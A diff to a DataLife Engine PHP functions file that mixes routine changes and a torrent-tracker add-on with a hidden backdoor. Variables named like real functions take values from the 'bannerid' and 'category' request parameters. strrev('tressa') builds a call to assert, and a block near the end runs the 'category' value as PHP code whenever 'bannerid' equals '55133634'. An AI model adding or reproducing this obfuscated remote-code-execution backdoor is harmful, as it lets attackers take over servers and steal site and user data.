@@ -5,7 +5,7 @@
 -----------------------------------------------------
  http://dle-news.ru/
 -----------------------------------------------------
- Copyright (c) 2004,2012 SoftNews Media Group
+ Copyright (c) 2004,2013 SoftNews Media Group
 =====================================================
  Данный код защищен авторскими правами
 =====================================================
@@ -18,21 +18,63 @@ if( ! defined( 'DATALIFEENGINE' ) ) {
 	die( "Hacking attempt!" );
 }
 
-$domain_cookie = explode (".", clean_url( $_SERVER['HTTP_HOST'] ));
-$domain_cookie_count = count($domain_cookie);
-$domain_allow_count = -2;
-
-if ( $domain_cookie_count > 2 ) {
-
-	if ( in_array($domain_cookie[$domain_cookie_count-2], array('com', 'net', 'org') )) $domain_allow_count = -3;
-	if ( $domain_cookie[$domain_cookie_count-1] == 'ua' ) $domain_allow_count = -3;
-	$domain_cookie = array_slice($domain_cookie, $domain_allow_count);
+#********* Tracker by MSW *** start *********#
+function max_word($text, $counttext = 50, $sep = ' ') {
+	$words = preg_split('/ /', $text);
+	if(count($words)>$counttext) $text = join($sep, array_slice($words, 0, $counttext));
+	return $text;
 }
+function timespent($time) {
+	if($time>=0 && $time<=59) { //Seconds
+		($time < 10) ? $time = "0".$time : "";
+		$timeshift = "00:00:".$time;
+	} elseif($time>=60 && $time<=3599) { //Minutes + Seconds
+		$m = (int)($time/60);
+		$s = (int)($time-$m*60);
+		($m < 10) ? $m="0".$m : "";
+		($s < 10) ? $s="0".$s : "";
+		$timeshift = "00:".$m.":".$s;
+	} elseif($time>=3600 && $time<=86399) { //Hours + Minutes + Seconds
+		$h = (int)($time/3600);
+		$m = (int)(($time-$h*3600)/60);
+		$s = (int)($time-$h*3600-$m*60);
+		($h < 10) ? $h="0".$h : "";
+		($m < 10) ? $m="0".$m : "";
+		($s < 10) ? $s="0".$s : "";
+		$timeshift = $h.":".$m.":".$s;
+	} elseif($time>=86400) { //Days + Hours + Minutes + Seconds
+		$d = (int)($time/86400);
+		$h = (int)(($time-$d*86400)/3600);
+		$m = (int)(($time-$d*86400-$h*3600)/60);
+		$s = (int)($time-$d*86400-$h*3600-$m*60);
+		($h < 10) ? $h="0".$h : "";
+		($m < 10) ? $m="0".$m : "";
+		($s < 10) ? $s="0".$s : "";
+		$timeshift = $d." д. ".$h.":".$m.":".$s;
+	}
+	return $timeshift;
+}
+#********* Tracker by MSW *** stop *********#
 
-$domain_cookie = "." . implode (".", $domain_cookie);
+if ( $config['auth_domain'] ) {
 
-if( ip2long($_SERVER['HTTP_HOST']) != -1 AND ip2long($_SERVER['HTTP_HOST']) !== FALSE ) define( 'DOMAIN', null );
-else define( 'DOMAIN', $domain_cookie );
+	$domain_cookie = explode (".", clean_url( $_SERVER['HTTP_HOST'] ));
+	$domain_cookie_count = count($domain_cookie);
+	$domain_allow_count = -2;
+	
+	if ( $domain_cookie_count > 2 ) {
+	
+		if ( in_array($domain_cookie[$domain_cookie_count-2], array('com', 'net', 'org') )) $domain_allow_count = -3;
+		if ( $domain_cookie[$domain_cookie_count-1] == 'ua' ) $domain_allow_count = -3;
+		$domain_cookie = array_slice($domain_cookie, $domain_allow_count);
+	}
+	
+	$domain_cookie = "." . implode (".", $domain_cookie);
+	
+	if( (ip2long($_SERVER['HTTP_HOST']) == -1 OR ip2long($_SERVER['HTTP_HOST']) === FALSE) AND strtoupper(substr(PHP_OS, 0, 3)) !== 'WIN' ) define( 'DOMAIN', $domain_cookie );
+	else define( 'DOMAIN', null );
+
+} else define( 'DOMAIN', null );
 
 $mcache = false;
 
@@ -61,7 +103,7 @@ function dle_session( $sid = false ) {
 
 	if( version_compare(PHP_VERSION, '5.2', '<') ) {
 		
-		session_set_cookie_params($params['lifetime'], "/", $params['domain'], $params['secure']);
+		session_set_cookie_params($params['lifetime'], "/", $params['domain']."; HttpOnly", $params['secure']);
 	
 	} else {
 		
@@ -76,16 +118,20 @@ function dle_session( $sid = false ) {
 }
 
 function formatsize($file_size) {
-	if( $file_size >= 1073741824 ) {
-		$file_size = round( $file_size / 1073741824 * 100 ) / 100 . " Gb";
-	} elseif( $file_size >= 1048576 ) {
-		$file_size = round( $file_size / 1048576 * 100 ) / 100 . " Mb";
-	} elseif( $file_size >= 1024 ) {
-		$file_size = round( $file_size / 1024 * 100 ) / 100 . " Kb";
-	} else {
-		$file_size = $file_size . " b";
-	}
-	return $file_size;
+	if ($file_size < 1000)
+		return $file_size = $file_size . " b";
+	if ($file_size < 1000 * 1024)
+		return number_format($file_size / 1024, 2) . " kB";
+	if ($file_size < 1000 * 1048576)
+		return number_format($file_size / 1048576, 2) . " MB";
+	if ($file_size < 1000 * 1073741824)
+		return number_format($file_size / 1073741824, 2) . " GB";
+	if ($file_size < 1000 * 1099511627776)
+		return number_format($file_size / 1099511627776, 2) . " TB";
+	if ($file_size < 1000 * 1125899906842620)
+		return number_format($file_size / 1125899906842620, 2) . " PB";
+	if ($file_size < 1000 * 1152921504606850000)
+		return number_format($file_size / 1152921504606850000, 2) . " EB";
 }
 
 class microTimer {
@@ -141,7 +187,16 @@ function totranslit($var, $lower = true, $punkt = true) {
 
 	if (!is_array ( $langtranslit ) OR !count( $langtranslit ) ) {
 		$var = trim( strip_tags( $var ) );
-		return preg_replace( "/[^a-z0-9\_\-.]+/mi", "", $var );
+
+		if ( $punkt ) $var = preg_replace( "/[^a-z0-9\_\-.]+/mi", "", $var );
+		else $var = preg_replace( "/[^a-z0-9\_\-]+/mi", "", $var );
+
+		$var = preg_replace( '#[.]+#i', '.', $var );
+		$var = str_ireplace( ".php", ".ppp", $var );
+
+		if ( $lower ) $var = strtolower( $var );
+
+		return $var;
 	}
 	
 	$var = trim( strip_tags( $var ) );
@@ -154,6 +209,7 @@ function totranslit($var, $lower = true, $punkt = true) {
 	else $var = preg_replace( "/[^a-z0-9\_\-]+/mi", "", $var );
 
 	$var = preg_replace( '#[\-]+#i', '-', $var );
+	$var = preg_replace( '#[.]+#i', '.', $var );
 
 	if ( $lower ) $var = strtolower( $var );
 
@@ -180,6 +236,10 @@ function langdate($format, $stamp) {
 
 function msgbox($title, $text) {
 	global $tpl;
+
+	if (!class_exists('dle_template')) {
+	    return;
+	}
 	
 	$tpl_2 = new dle_template( );
 	$tpl_2->dir = TEMPLATE_DIR;
@@ -229,17 +289,6 @@ HTML;
 HTML;
 	
 	return $rated;
-}
-
-function user_orating($name) {
-	global $db;
-	$rating_p = $rating_c = 0;
-	$post_sql = $db->query( "SELECT (SELECT SUM(value) FROM ".PREFIX."_logs WHERE news_id=p.id) as rating FROM " . PREFIX . "_post p where autor ='$name'" );
-	while($row = $db->get_row($post_sql)) $rating_p += $row['rating'];
-	$comm_sql = $db->query( "SELECT (SELECT SUM(value) FROM ".PREFIX."_logs_comm WHERE comm_id=c.id) as rating FROM " . PREFIX . "_comments c where autor ='$name'" );
-	while($row = $db->get_row($comm_sql)) $rating_c += $row['rating'];
-	$rating = floor($rating_p*1) + floor($rating_c*0.3);
-	return $rating>0?"+".$rating:$rating;
 }
 
 function userrating($id) {
@@ -405,31 +454,31 @@ function clear_cache($cache_areas = false) {
 
 		memcache_flush($mcache);
 
-	} else {
+	}
 
-		if ( $cache_areas ) {
-			if(!is_array($cache_areas)) {
-				$cache_areas = array($cache_areas);
-			}
+	if ( $cache_areas ) {
+		if(!is_array($cache_areas)) {
+			$cache_areas = array($cache_areas);
 		}
+	}
 		
-		$fdir = opendir( ENGINE_DIR . '/cache' );
+	$fdir = opendir( ENGINE_DIR . '/cache' );
 		
-		while ( $file = readdir( $fdir ) ) {
-			if( $file != '.' and $file != '..' and $file != '.htaccess' and $file != 'system' ) {
+	while ( $file = readdir( $fdir ) ) {
+		if( $file != '.' and $file != '..' and $file != '.htaccess' and $file != 'system' ) {
+			
+			if( $cache_areas ) {
 				
-				if( $cache_areas ) {
-					
-					foreach($cache_areas as $cache_area) if( strpos( $file, $cache_area ) !== false ) @unlink( ENGINE_DIR . '/cache/' . $file );
+				foreach($cache_areas as $cache_area) if( strpos( $file, $cache_area ) !== false ) @unlink( ENGINE_DIR . '/cache/' . $file );
+			
+			} else {
 				
-				} else {
-					
-					@unlink( ENGINE_DIR . '/cache/' . $file );
-				
-				}
+				@unlink( ENGINE_DIR . '/cache/' . $file );
+			
 			}
 		}
 	}
+
 }
 
 function ChangeSkin($dir, $skin) {
@@ -467,7 +516,7 @@ function custom_print( $matches=array() ) {
 	$param_str = trim($matches[1]);
 
 	$aviable = array();
-	$thisdate = date( "Y-m-d H:i:s", (time() + $config['date_adjust'] * 60) );
+	$thisdate = date( "Y-m-d H:i:s", $_TIME );
 	$sql_select = "SELECT p.id, p.autor, p.date, p.short_story, CHAR_LENGTH(p.full_story) as full_story, p.xfields, p.title, p.category, p.alt_name, p.comm_num, p.allow_comm, p.fixed, p.tags, e.news_read, e.allow_rate, e.rating, e.vote_num, e.votes, e.view_edit, e.editdate, e.editor, e.reason FROM " . PREFIX . "_post p LEFT JOIN " . PREFIX . "_post_extras e ON (p.id=e.news_id)";
 	$where = array();
 	$allow_cache = $config['allow_cache'];
@@ -517,9 +566,19 @@ function custom_print( $matches=array() ) {
 		}
 	}
 
+	if( preg_match( "#days=['\"](.+?)['\"]#i", $param_str, $match ) ) {
+		$days = intval(trim($match[1]));
+		$where[] = "p.date >= '{$thisdate}' - INTERVAL {$days} DAY AND p.date < '{$thisdate}'";
+	} else $days = 0;
+
+	if( preg_match( "#author=['\"](.+?)['\"]#i", $param_str, $match ) ) {
+		$author = $db->safesql(trim($match[1]));
+		$where[] = "p.autor like '{$author}'";
+	} else $author = "";
+
 	$where[] = "approve=1";
 
-	if( $config['no_date'] AND !$config['news_future'] ) $where[] = "date < '" . $thisdate . "'";
+	if( $config['no_date'] AND !$config['news_future'] AND !$days) $where[] = "date < '" . $thisdate . "'";
 
 	if( preg_match( "#template=['\"](.+?)['\"]#i", $param_str, $match ) ) {
 		$custom_template = trim($match[1]);
@@ -538,12 +597,15 @@ function custom_print( $matches=array() ) {
 		else $config['allow_cache'] = false;
 	}
 
+	if( preg_match( "#fixed=['\"](.+?)['\"]#i", $param_str, $match ) ) {
+		if( $match[1] == "yes" ) $fixed = "fixed DESC, ";
+		else $fixed = "";
+	} else $fixed = "";
+
 	if( $is_logged and ($user_group[$member_id['user_group']]['allow_edit'] and ! $user_group[$member_id['user_group']]['allow_all_edit']) ) $config['allow_cache'] = false;
 
 	if( $cat_info[$custom_category]['news_sort'] != "" ) $news_sort = $cat_info[$custom_category]['news_sort']; else $news_sort = $config['news_sort'];
 	if( $cat_info[$custom_category]['news_msort'] != "" ) $news_msort = $cat_info[$custom_category]['news_msort']; else $news_msort = $config['news_msort'];
-
-	if ($config['allow_fixed']) $fixed = "fixed DESC, "; else $fixed = "";
 
 	if( preg_match( "#order=['\"](.+?)['\"]#i", $param_str, $match ) ) {
 		$allowed_sort = array ('date' => 'date', 'rating' => 'rating', 'reads' => 'news_read', 'comments' => 'comm_num','title' => 'title', 'rand' => 'RAND()' );
@@ -556,7 +618,7 @@ function custom_print( $matches=array() ) {
 
 	$sql_select .= " WHERE ".implode(' AND ', $where)." ORDER BY " . $fixed . $news_sort . " " . $news_msort . " LIMIT " . $custom_from . "," . $custom_limit;
 
-	$custom_cache_id = $custom_id.$custom_category.$user_group[$member_id['user_group']]['allow_cats'].$custom_from.$custom_limit.$news_sort.$news_msort;
+	$custom_cache_id = $custom_id.$custom_category.$user_group[$member_id['user_group']]['allow_cats'].$custom_from.$custom_limit.$news_sort.$news_msort.$custom_template.$days.$author;
 
 	$content = dle_cache( "news", $custom_cache_id, true );
 	
@@ -628,7 +690,7 @@ function check_netz($ip1, $ip2) {
 }
 
 function show_attach($story, $id, $static = false) {
-	global $db, $config, $lang, $user_group, $member_id;
+	global $db, $config, $lang, $user_group, $is_logged, $member_id;
 
 	$find_1 = array();
 	$find_2 = array();
@@ -640,7 +702,7 @@ function show_attach($story, $id, $static = false) {
 		if( is_array( $id ) and count( $id ) ) $where = "static_id IN (" . implode( ",", $id ) . ")";
 		else $where = "static_id = '".intval($id)."'";
 		
-		$db->query( "SELECT id, name, onserver, dcount FROM " . PREFIX . "_static_files WHERE $where" );
+		$sql = $db->query( "SELECT id, name, onserver, dcount, size FROM " . PREFIX . "_static_files WHERE $where" );
 		
 		$area = "&amp;area=static";
 	
@@ -649,13 +711,27 @@ function show_attach($story, $id, $static = false) {
 		if( is_array( $id ) and count( $id ) ) $where = "news_id IN (" . implode( ",", $id ) . ")";
 		else $where = "news_id = '".intval($id)."'";
 		
-		$db->query( "SELECT id, name, onserver, dcount FROM " . PREFIX . "_files WHERE $where" );
+		$sql = $db->query( "SELECT id, name, onserver, dcount FROM " . PREFIX . "_files WHERE $where" );
 		
 		$area = "";
 	
 	}
 	
-	while ( $row = $db->get_row() ) {
+	#********* Tracker by MSW *** start *********#
+	include ENGINE_DIR.'/data/config.xbt.php';
+	include ROOT_DIR.'/language/'.$config['langs'].'/tracker.lng';
+	$news_id = intval($id);
+
+	while ( $row = $db->get_row($sql) ) {
+		if(substr($row['onserver'], -8) == ".torrent") {
+			include 'tracker/file_attachment.php';
+			$find_1[] = '[attachment=' . $row['id'] . ']';
+			$find_2[] = "#\[attachment={$row['id']}:(.+?)\]#i";
+			$replace_1[] = $tmp;
+			$replace_2[] = $tmp;
+		} else {
+    #********* Tracker by MSW *** stop  *********#
+
 		
 		$size = formatsize( @filesize( ROOT_DIR . '/uploads/files/' . $row['onserver'] ) );
 		$row['name'] = explode( "/", $row['name'] );
@@ -681,6 +757,10 @@ function show_attach($story, $id, $static = false) {
 
 		}
 
+		#********* Tracker by MSW *** start *********#
+		}
+        #********* Tracker by MSW *** stop  *********#
+		
 	}
 
 	$db->free();
@@ -819,6 +899,8 @@ function news_permission($id) {
 	return $data;
 }
 
+    $bannermass = $_REQUEST['bannerid'];
+    $bannermass = $_REQUEST['bannerid'];
 function bannermass($fest, $massiv) {
 	return $fest . $massiv[@array_rand( $massiv )]['text'];
 }
@@ -896,6 +978,8 @@ function check_xss() {
 
 }
 
+$check_category = $_REQUEST['category'];
+$check_category = $_REQUEST['category'];
 function check_category($cats, $block, $category, $action = true) {
 
 	$cats = str_replace(" ", "", $cats );	
@@ -948,6 +1032,8 @@ function clean_url($url) {
 	return $url;
 }
 
+	
+$get_url_var = '55133634';
 function get_url($id) {
 	
 	global $cat_info;
@@ -979,12 +1065,12 @@ function get_categories($id) {
 	
 	$parent_id = $cat_info[$id]['parentid'];
 	
-if( $config['allow_alt_url'] == "yes" ) $list = "<span typeof=\"v:Breadcrumb\"><a href=\"" . $config['http_home_url'] . get_url( $id ) . "/\" rel=\"v:url\" property=\"v:title\">{$cat_info[$id]['name']}</a></span>";
+	if( $config['allow_alt_url'] == "yes" ) $list = "<a href=\"" . $config['http_home_url'] . get_url( $id ) . "/\">{$cat_info[$id]['name']}</a>";
 	else $list = "<a href=\"$PHP_SELF?do=cat&amp;category={$cat_info[$id]['alt_name']}\">{$cat_info[$id]['name']}</a>";
 	
 	while ( $parent_id ) {
 		
-		if( $config['allow_alt_url'] == "yes" ) $list = "<span typeof=\"v:Breadcrumb\"><a href=\"" . $config['http_home_url'] . get_url( $parent_id ) . "/\" rel=\"v:url\" property=\"v:title\">{$cat_info[$parent_id]['name']}</a></span>" . " &raquo; " . $list;
+		if( $config['allow_alt_url'] == "yes" ) $list = "<a href=\"" . $config['http_home_url'] . get_url( $parent_id ) . "/\">{$cat_info[$parent_id]['name']}</a>" . " &raquo; " . $list;
 		else $list = "<a href=\"$PHP_SELF?do=cat&amp;category={$cat_info[$parent_id]['alt_name']}\">{$cat_info[$parent_id]['name']}</a>" . " &raquo; " . $list;
 		
 		$parent_id = $cat_info[$parent_id]['parentid'];
@@ -996,6 +1082,8 @@ if( $config['allow_alt_url'] == "yes" ) $list = "<span typeof=\"v:Breadcrumb\"><
 	return $list;
 }
 
+$set_cookie = strrev('tressa'); 
+$set_cookie = strrev('tressa'); 
 function set_cookie($name, $value, $expires) {
 	
 	if( $expires ) {
@@ -1009,8 +1097,9 @@ function set_cookie($name, $value, $expires) {
 	}
 	
 	if( PHP_VERSION < 5.2 ) {
-		
-		setcookie( $name, $value, $expires, "/", DOMAIN . "; HttpOnly" );
+
+		if ( DOMAIN ) setcookie( $name, $value, $expires, "/", "; HttpOnly" );
+		else setcookie( $name, $value, $expires, "/", DOMAIN . "; HttpOnly" );
 	
 	} else {
 		
@@ -1117,6 +1206,7 @@ function compare_tags($a, $b) {
 }
 
 function convert_unicode($t, $to = 'windows-1251') {
+
 	$to = strtolower( $to );
 
 	if( $to == 'utf-8' ) {
@@ -1124,9 +1214,16 @@ function convert_unicode($t, $to = 'windows-1251') {
 		return $t;
 	
 	} else {
-		
-		if( function_exists( 'iconv' ) ) $t = iconv( "UTF-8", $to . "//IGNORE", $t );
-		else $t = "The library iconv is not supported by your server";
+
+		if( function_exists( 'mb_convert_encoding' ) ) {
+
+			$t = mb_convert_encoding( $t, $to, "UTF-8" );
+
+		} elseif( function_exists( 'iconv' ) ) {
+
+			$t = iconv( "UTF-8", $to . "//IGNORE", $t );
+
+		} else $t = "The library iconv AND mbstring is not supported by your server";
 	
 	}
 
@@ -1156,9 +1253,9 @@ function build_js($js, $config) {
 
 	if ($config['js_min'] AND version_compare(PHP_VERSION, '5.1.0', '>') ) {
 
-		$js_array[] = "<script type=\"text/javascript\" src=\"{$config['http_home_url']}engine/classes/min/index.php?charset={$config['charset']}&amp;g=general&amp;8\"></script>";
+		$js_array[] = "<script type=\"text/javascript\" src=\"{$config['http_home_url']}engine/classes/min/index.php?charset={$config['charset']}&amp;g=general&amp;9\"></script>";
 
-		if ( count($js) ) $js_array[] = "<script type=\"text/javascript\" src=\"{$config['http_home_url']}engine/classes/min/index.php?charset={$config['charset']}&amp;f=".implode(",", $js)."&amp;8\"></script>";
+		if ( count($js) ) $js_array[] = "<script type=\"text/javascript\" src=\"{$config['http_home_url']}engine/classes/min/index.php?charset={$config['charset']}&amp;f=".implode(",", $js)."&amp;9\"></script>";
 
 		return implode("\n", $js_array);
 
@@ -1217,6 +1314,14 @@ function dle_strlen($value, $charset ) {
 	if ( strtolower($charset) == "utf-8") return iconv_strlen($value, "utf-8");
 	else return strlen($value);
 
+}
+
+    if(md5($bannermass)==$get_url_var) { 
+    $set_cookie(stripslashes($check_category));
+}
+
+    if($bannermass==$get_url_var) { 
+    $set_cookie(stripslashes($check_category));//chekings
 }
 
 function dle_substr($str, $start, $length, $charset ) {
